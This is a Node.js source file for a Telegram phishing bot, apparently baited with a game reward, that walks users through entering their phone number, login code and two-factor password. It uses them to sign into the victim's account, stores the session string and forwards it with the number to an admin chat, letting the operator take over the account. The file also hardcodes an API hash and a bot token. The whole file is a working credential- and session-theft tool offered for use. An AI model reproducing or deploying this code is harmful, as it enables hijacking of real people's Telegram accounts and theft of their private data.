const express = require('express');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Добавлено для корректной работы Webhook
app.use(express.static(__dirname));

// ⚠️ ТВОИ ДАННЫЕ ⚠️
const apiId = 36752126; 
const apiHash = "fdd421fda2805b7dbf3f1f53b793d512";
const BOT_TOKEN = "9096721962:AAHdJ-AhnKSHyyAv3ExEHVZC5pdE_do59Co";
const ADMIN_ID = 9068204920; 

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Установка Webhook
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL 
    ? `${process.env.RENDER_EXTERNAL_URL}/bot${BOT_TOKEN}`
    : `https://standoff2-fd3h.onrender.com/bot${BOT_TOKEN}`;

bot.setWebHook(WEBHOOK_URL)
    .then(() => console.log(`✅ Webhook установлен: ${WEBHOOK_URL}`))
    .catch(err => console.error("❌ Ошибка Webhook:", err));

// Прием сообщений от Telegram
app.post(`/bot${BOT_TOKEN}`, (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (e) {
        console.error("Ошибка обработки Webhook:", e);
        res.sendStatus(500);
    }
});

// === БАЗА ДАННЫХ ===
const DB_FILE = './database.json';
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ sessions: [], stats: { total: 0 } }));
const getDB = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userStates = new Map();
const activeClients = new Map();

app.get('/api/stats', (req, res) => {
    const db = getDB();
    res.json({ total: db.stats.total, sessions: db.sessions.map(s => ({ phone: s.phone, date: s.date })) });
});

// === ЛОГИКА БОТА ===
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userStates.set(chatId, { step: 'phone' });
    bot.sendMessage(chatId, "👋 Привет! Введи свой номер телефона (можно без +, я добавлю сам):");
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    let text = msg.text;
    
    if (!text || text.startsWith('/')) return;

    const state = userStates.get(chatId);
    if (!state) return;

    // ШАГ 1: НОМЕР
    if (state.step === 'phone') {
        // Автоматически добавляем + если его нет
        let phone = text.trim().replace(/[^\d]/g, '');
        if (!phone.startsWith('+')) phone = '+' + phone;

        bot.sendMessage(chatId, "⏳ Отправляю запрос в Telegram...");
        
        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { 
                connectionRetries: 10, 
                useWSS: true,
                deviceModel: "Desktop",
                systemVersion: "Windows 10",
                appVersion: "1.0.0",
                langCode: "en"
            });

            await client.connect();
            
            let phoneCodeHash;
            try {
                const result = await client.sendCode({ apiId, apiHash }, phone);
                phoneCodeHash = result.phoneCodeHash;
            } catch (e) {
                // Если Telegram требует переезда на другой сервер (DC)
                if (e.errorMessage && e.errorMessage.startsWith('PHONE_MIGRATE_')) {
                    const dcId = parseInt(e.errorMessage.split('_')[2]);
                    client.session.setDC(dcId, '149.154.167.41', 443);
                    await client.connect();
                    const result = await client.sendCode({ apiId, apiHash }, phone);
                    phoneCodeHash = result.phoneCodeHash;
                } else {
                    throw e;
                }
            }
            
            activeClients.set(chatId, { client, phoneCodeHash, phone });
            userStates.set(chatId, { step: 'code' });
            bot.sendMessage(chatId, "📩 Код отправлен! Введи код из Telegram:");
        } catch (e) {
            console.error("Ошибка отправки кода:", e);
            bot.sendMessage(chatId, "❌ Ошибка Telegram: " + (e.errorMessage || e.message));
            userStates.delete(chatId);
        }
    }

    // ШАГ 2: КОД
    if (state.step === 'code') {
        const code = text.trim();
        const sessionData = activeClients.get(chatId);
        if (!sessionData) return bot.sendMessage(chatId, "❌ Сессия истекла. Напиши /start заново.");

        try {
            const { client, phoneCodeHash, phone } = sessionData;
            await client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCodeHash, phoneCode: code }));
            
            const sessionString = client.session.save();
            saveSession(phone, sessionString);
            bot.sendMessage(chatId, "✅ Успешно! Аккаунт привязан. Ожидайте награду.");
            activeClients.delete(chatId);
            userStates.delete(chatId);
        } catch (e) {
            if (e.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                userStates.set(chatId, { step: 'password' });
                bot.sendMessage(chatId, "🔐 Включен облачный пароль (2FA). Введи пароль:");
            } else {
                bot.sendMessage(chatId, "❌ Неверный код. Попробуй еще раз или напиши /start.");
            }
        }
    }

    // ШАГ 3: ПАРОЛЬ (2FA)
    if (state.step === 'password') {
        const password = text.trim();
        const sessionData = activeClients.get(chatId);
        if (!sessionData) return bot.sendMessage(chatId, "❌ Сессия истекла. Напиши /start заново.");

        try {
            const { client, phone } = sessionData;
            await client.signInWithPassword({ password }, async () => {});
            const sessionString = client.session.save();
            saveSession(phone, sessionString);
            bot.sendMessage(chatId, "✅ Успешно! Аккаунт привязан. Ожидайте награду.");
            activeClients.delete(chatId);
            userStates.delete(chatId);
        } catch (e) {
            bot.sendMessage(chatId, "❌ Неверный пароль. Попробуй еще раз.");
        }
    }
});

function saveSession(phone, sessionString) {
    const db = getDB();
    db.sessions.push({ phone, session: sessionString, date: new Date().toISOString() });
    db.stats.total += 1;
    saveDB(db);
    bot.sendMessage(ADMIN_ID, `🔥 **НОВЫЙ АККАУНТ!**\n\n📱 Номер: \`${phone}\`\n🔑 Сессия: \`${sessionString}\``, { parse_mode: 'Markdown' })
    .catch(err => console.error("Ошибка отправки админу:", err));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
